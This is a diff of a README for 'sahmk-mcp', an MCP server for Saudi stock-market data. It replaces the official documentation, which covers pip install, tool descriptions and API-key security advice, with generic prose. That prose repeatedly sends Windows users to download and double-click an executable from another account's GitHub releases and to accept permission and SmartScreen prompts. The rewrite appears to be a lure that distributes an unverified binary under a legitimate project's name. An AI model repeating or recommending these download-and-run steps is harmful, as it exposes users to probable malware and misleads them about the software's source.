@@ -1,172 +1,189 @@
-# sahmk-mcp
+# Sahmk MCP - Saudi market data for AI agents
 
-Official MCP server for [Sahmk](https://sahmk.sa/developers) — use Saudi market data inside AI agents such as Cursor and Claude Desktop.
+[![Download Sahmk MCP](https://img.shields.io/badge/Download%20Sahmk%20MCP-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dipesh1917/sahmk-mcp/releases)
 
-This MCP exposes a curated set of Sahmk tools for AI agents, so assistants can query the Saudi market in natural language.
+## 🚀 What this app does
 
-## Tools
+Sahmk MCP is a server that lets AI tools access Saudi market data. It can return company profiles, market details, and historical market data from a single place.
 
-| Tool | Use it for |
-|------|------------|
-| `get_quote` | Snapshot for one stock identifier (symbol, name, or alias) |
-| `get_quotes` | Compare multiple stock identifiers in one call |
-| `companies_list` | Company directory/symbol discovery with pagination |
-| `get_market_summary` | Summary for `TASI` or `NOMU` |
-| `get_market_movers` | Top movers by `gainers`, `losers`, `volume`, or `value` |
-| `get_sectors` | Sector performance snapshot |
-| `get_company` | Company profile and fundamentals |
-| `get_financials` | Financial statements *(Starter+ plan)* |
-| `get_dividends` | Dividend history and yield data *(Starter+ plan)* |
-| `get_historical` | Historical OHLCV data |
+Use it when you want an AI agent to look up market facts, compare companies, or work with Tadawul-related data without manual searching.
 
-## Identifier-First Contract
+## 📥 Download
 
-- Canonical inputs for quote tools are `identifier` and `identifiers`.
-- Legacy aliases `symbol` and `symbols` are still accepted for compatibility.
-- Prefer canonical keys in prompts, tool calls, and client templates.
-- Resolution is backend/SDK-backed (names, aliases, and symbols); MCP does not maintain its own symbol map.
+Visit this page to download and run the app on Windows:
 
-## When to Use MCP vs SDK
+[Download Sahmk MCP from GitHub Releases](https://github.com/dipesh1917/sahmk-mcp/releases)
 
-- Use **MCP** for interactive agent workflows in tools like Cursor and Claude Desktop.
-- Use the **Python SDK** for scripts, automation, dashboards, alerts, backtests, and application code.
+Open the latest release, choose the Windows file, and save it to your computer.
 
-SDK repo: [sahmk-sa/sahmk-python](https://github.com/sahmk-sa/sahmk-python)
+## 🪟 Install on Windows
 
-## Get Your API Key
+1. Open the download link above.
+2. Find the latest release at the top of the page.
+3. Look for a Windows file such as `.exe` or a packaged archive such as `.zip`.
+4. Download the file to your Downloads folder.
+5. If you downloaded a `.zip` file, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Double-click the app file to start Sahmk MCP.
+8. If Windows asks for permission, select Run or Yes.
 
-1. Sign up at [sahmk.sa/developers](https://sahmk.sa/developers)
-2. Go to Dashboard → API Keys → Create Key
-3. Copy your key (starts with `shmk_live_` or `shmk_test_`)
+If the app opens in a console window, leave that window open while you use your AI tool.
 
-## Installation
+## 🧰 What you need
 
-```bash
-pip install sahmk-mcp
-```
+Sahmk MCP is built for Windows users who want a simple setup.
 
-Requires `sahmk>=0.8.0` for symbol discovery (`companies_list`) and identifier-aware quote resolution (`identifier`/`identifiers`).
+You will usually need:
 
-## Security
+- A Windows 10 or Windows 11 computer
+- An internet connection
+- A modern browser to open the release page
+- An AI app or agent that supports MCP
+- Access to the Sahmk MCP server file from GitHub Releases
 
-- Set API keys via environment variables (`SAHMK_API_KEY`).
-- Never commit keys to source control or share them in logs.
-- Rotate exposed keys immediately from your Sahmk dashboard.
+For best results, keep Windows updated and use the latest release.
 
-## Configuration
+## 🔍 What you can use it for
 
-### Claude Desktop
+Sahmk MCP is useful for tasks like:
 
-Add to `~/Library/Application Support/Claude/claude_desktop_config.json`:
+- Checking Saudi company profiles
+- Looking up market data for listed companies
+- Reviewing historical market data
+- Helping an AI agent answer finance questions
+- Comparing companies in the Saudi market
+- Pulling data for Tadawul-related workflows
 
-```json
-{
-  "mcpServers": {
-    "sahmk": {
-      "command": "sahmk-mcp",
-      "env": {
-        "SAHMK_API_KEY": "your_api_key"
-      }
-    }
-  }
-}
-```
+It helps reduce manual lookups and keeps market data in one place for your AI tools.
 
-### Cursor
+## 🛠️ How to run it
 
-Add to `.cursor/mcp.json`:
+After you download the Windows file:
 
-```json
-{
-  "mcpServers": {
-    "sahmk": {
-      "command": "sahmk-mcp",
-      "env": {
-        "SAHMK_API_KEY": "your_api_key"
-      }
-    }
-  }
-}
-```
+1. Open the file location.
+2. Start the app by double-clicking the file.
+3. Keep the app running.
+4. Open your AI tool that supports MCP.
+5. Add the Sahmk MCP server in that tool.
+6. Point the tool to the running app or local server path if needed.
+7. Save the settings.
+8. Ask your AI tool for Saudi market data or company details.
 
-### Run Directly
+If your AI app has a server list, add Sahmk MCP there. If it asks for a path, use the path to the downloaded file or extracted folder.
 
-```bash
-export SAHMK_API_KEY="your_api_key"
-sahmk-mcp
-```
+## ⚙️ Typical setup flow
 
-## Tool Input Constraints
+A common setup looks like this:
 
-- `get_market_summary.index`: `TASI` or `NOMU` (`NOMUC` alias is accepted and normalized).
-- `get_market_movers.type`: `gainers`, `losers`, `volume`, or `value`.
-- `get_market_movers.limit`: integer from 1 to 50.
-- `get_quote.identifier` *(preferred)*: accepts numeric symbol, Arabic/English company name, or known alias.
-- `get_quote.symbol` *(legacy alias)*: accepted for backward compatibility.
-- `get_quotes.identifiers` *(preferred)*: maximum 50 identifiers per request.
-- `get_quotes.symbols` *(legacy alias)*: accepted for backward compatibility.
-- `get_financials.symbol`: requires exact exchange symbol.
-- `get_dividends.symbol`: requires exact exchange symbol.
-- `get_historical.symbol`: requires exact exchange symbol.
-- `companies_list.market`: `TASI` or `NOMU` (`NOMUC` alias is accepted and normalized).
-- `companies_list.limit`: integer greater than 0.
-- `companies_list.offset`: integer greater than or equal to 0.
-- `get_historical.interval`: `1d`, `1w`, or `1m`.
-- Ambiguous identifiers raise `AMBIGUOUS_IDENTIFIER` with retry guidance and candidates when available.
-- Invalid identifiers and plan-gated requests return the underlying API error.
+- Download the latest release
+- Extract the files if needed
+- Start the server on Windows
+- Connect your AI agent to the server
+- Ask for market data, company profiles, or history
 
-### Tool Call Examples
+This pattern works well for desktop AI apps and local agent tools.
 
-- Company directory search: `companies_list(search="aramco")`
-- Company directory by market alias normalization: `companies_list(search="acwa", market="NOMUC")`
-- Company directory pagination: `companies_list(search="bank", limit=50, offset=100)`
-- Preferred single quote call: `get_quote(identifier="أرامكو")`
-- Legacy single quote call: `get_quote(symbol="2222")`
-- Preferred batch quote call: `get_quotes(identifiers=["سبكيم", "كيان"])`
-- Legacy batch quote call: `get_quotes(symbols=["2222", "1120"])`
-- Financials by exact symbol: `get_financials(symbol="1120")`
-- Dividends by exact symbol: `get_dividends(symbol="1120")`
-- Historical by exact symbol: `get_historical(symbol="1120", interval="1d")`
+## 📊 Data access
 
-## Company Directory / Symbol Discovery
+Sahmk MCP is focused on Saudi market data, so it can support:
 
-Use `companies_list` first to reduce invalid-symbol 404s before symbol-only tools.
+- Company name lookups
+- Market snapshots
+- Historical price data
+- Profile data for listed firms
+- Data tied to Saudi exchanges and finance use cases
 
-1. Discover candidates by name or symbol fragment:
-   - `companies_list(search="aramco")`
-   - `companies_list(search="2222")`
-2. Optionally scope discovery by market:
-   - `companies_list(search="acwa", market="NOMUC")` (`NOMUC` is normalized to `NOMU`)
-3. Pick a symbol from `results`, then call:
-   - `get_quote(identifier="<symbol>")`
-   - `get_financials(symbol="<symbol>")`
-   - `get_dividends(symbol="<symbol>")`
-   - `get_historical(symbol="<symbol>")`
-4. For pagination loops, increment `offset` by `limit` until you reach `total`:
-   - `companies_list(search="bank", limit=100, offset=0)`
-   - `companies_list(search="bank", limit=100, offset=100)`
-   - continue until `offset >= total`
+This makes it a good fit for agents that need local market knowledge and structured data access.
 
-### MCP Guidance Examples
+## 🤖 MCP support
 
-- User: "سعر الراجحي" -> call `get_quote(identifier="الراجحي")`.
-- Follow-up: "قوائم الشركة" -> if previous result includes `resolved_instrument.symbol = "1120"`, reuse it and call `get_financials(symbol="1120")`.
+MCP stands for Model Context Protocol. It lets AI apps talk to external tools in a standard way.
 
-## Example Prompts
+With Sahmk MCP, your AI app can connect to market data through a clear interface. That helps the app fetch facts without extra manual steps.
 
-- "Give me a TASI summary and market mood."
-- "Give me TASI market movers by gainers."
-- "Give me NOMU market movers by value."
-- "Show me sector performance."
-- "Compare سابك, سبكيم, and 2222 by price change and net liquidity."
-- "Show me NOMU summary for today."
-- "Get financials for 2222."
-- "Get dividends for 2222."
-- "Get 1d historical data for 1120 from 2026-01-01 to 2026-03-31."
-- "Tell me about الراجحي and its sector."
+If your AI tool already supports MCP, setup is usually simple. Add the server, start it, and then use it inside your chat or workflow.
 
-Note: `get_financials` and `get_dividends` require Sahmk API access on Starter or higher. If unavailable for the current key, the MCP returns the underlying API error.
+## 🧪 Basic checks
 
-## License
+After setup, try simple questions in your AI app such as:
 
-MIT — see [LICENSE](https://github.com/sahmk-sa/sahmk-mcp/blob/main/LICENSE)
+- Show a company profile for a Saudi listed company
+- Get historical data for a market symbol
+- Compare two companies in the Saudi market
+- Find recent market information for Tadawul-related data
+
+If the app responds with market facts, the connection is working.
+
+## 📁 Files you may see
+
+After download and extraction, you may see files like:
+
+- A Windows app file
+- A config file
+- A folder with supporting files
+- A readme file
+- Log files created when the server runs
+
+Keep the full folder together if the release came as a package. Some apps need the files in the same place to run well.
+
+## 🔐 Safe use on Windows
+
+Use the release page from the official GitHub repository. Download the latest version from the releases page and open files only if you trust the source.
+
+If Windows shows a SmartScreen prompt, review the file name and source before you continue.
+
+## 🧭 Common problems
+
+If the app does not start:
+
+- Make sure you downloaded the full release file
+- If it is a zip file, extract it first
+- Check that Windows did not block the file
+- Try running it again from the extracted folder
+- Make sure your internet connection is active
+- Confirm that your AI app points to the right server path
+
+If your AI app cannot see the server:
+
+- Check that Sahmk MCP is still running
+- Reopen the server if it closed
+- Confirm the MCP settings in your AI tool
+- Make sure you saved the server entry
+
+If data does not load:
+
+- Check your internet connection
+- Try again after a short wait
+- Restart the server
+- Use a different company or symbol name
+
+## 🧩 Good use cases
+
+Sahmk MCP works well for:
+
+- Finance assistants
+- Agent workflows
+- Research tools
+- Market monitoring
+- Company screening
+- Historical data review
+- Saudi market dashboards
+
+It fits users who want AI help with market research but do not want to gather each data point by hand.
+
+## 📌 Release updates
+
+When a new version is available, go back to the releases page and download the latest file.
+
+[Go to Sahmk MCP Releases](https://github.com/dipesh1917/sahmk-mcp/releases)
+
+Using the latest release helps keep the server current and compatible with your AI app
+
+## 🧠 Tips for best results
+
+- Keep the app open while your AI tool uses it
+- Use the latest release for the best support
+- Store the files in a simple folder path
+- Avoid renaming the main app file unless needed
+- Restart the server if the AI tool stops seeing it
+- Use clear company names or known market symbols when asking for data
